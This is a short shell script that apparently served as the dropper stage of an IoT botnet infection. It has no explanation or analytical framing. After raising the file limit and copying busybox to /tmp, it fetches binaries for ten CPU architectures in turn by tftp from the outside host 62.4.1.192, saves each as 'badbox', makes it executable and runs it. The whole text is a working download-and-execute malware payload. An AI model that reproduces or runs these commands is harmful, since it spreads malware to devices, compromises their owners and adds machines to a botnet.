ulimit -n 1024
cp /bin/busybox /tmp/
cd /tmp; tftp -r jackmymips -g 62.4.1.192;cat jackmymips >badbox;chmod +x *;./badbox
cd /tmp; tftp -r jackmymipsel -g 62.4.1.192;cat jackmymipsel >badbox;chmod +x *;./badbox
cd /tmp; tftp -r jackmysh4 -g 62.4.1.192;cat jackmysh4 >badbox;chmod +x *;./badbox
cd /tmp; tftp -r jackmyx86 -g 62.4.1.192;cat jackmyx86 >badbox;chmod +x *;./badbox
cd /tmp; tftp -r jackmyi686 -g 62.4.1.192;cat jackmyi686 >badbox;chmod +x *;./badbox
cd /tmp; tftp -r jackmypowerpc -g 62.4.1.192;cat jackmypowerpc >badbox;chmod +x *;./badbox
cd /tmp; tftp -r jackmyi586 -g 62.4.1.192;cat jackmyi586 >badbox;chmod +x *;./badbox
cd /tmp; tftp -r jackmym86k -g 62.4.1.192;cat jackmym86k >badbox;chmod +x *;./badbox
cd /tmp; tftp -r jackmyarmv4 -g 62.4.1.192;cat jackmyarmv4 >badbox;chmod +x *;./badbox
cd /tmp; tftp -r jackmyarmv5 -g 62.4.1.192;cat jackmyarmv5 >badbox;chmod +x *;./badbox